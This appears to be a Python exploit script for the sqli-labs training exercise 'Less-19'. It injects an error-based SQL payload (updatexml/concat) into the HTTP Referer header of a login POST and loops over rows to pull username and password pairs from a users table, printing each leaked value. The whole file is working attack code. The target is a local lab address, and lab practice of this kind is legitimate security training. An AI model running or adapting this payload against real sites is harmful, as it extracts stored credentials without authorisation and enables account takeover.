#coding:utf-8
import requests

valuelen = 100

def getPostData(i):
    postdata = {"uname":"admin", "passwd":"123"}
    return postdata

def getHeader(i):
    referer = "http://10.0.2.15/sqli/Less-19/' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit %s,1),0x7e),1) or '1' = '1"%i
    header = {'Referer':referer}
    return header

url = "http://10.0.2.15/sqli/Less-19/"
for i in range(0,valuelen):
    res = requests.post(url, data = getPostData(i), headers = getHeader(i))
    if "error" in res.content:
	print(res.content.split('~')[1])
    else:
	break

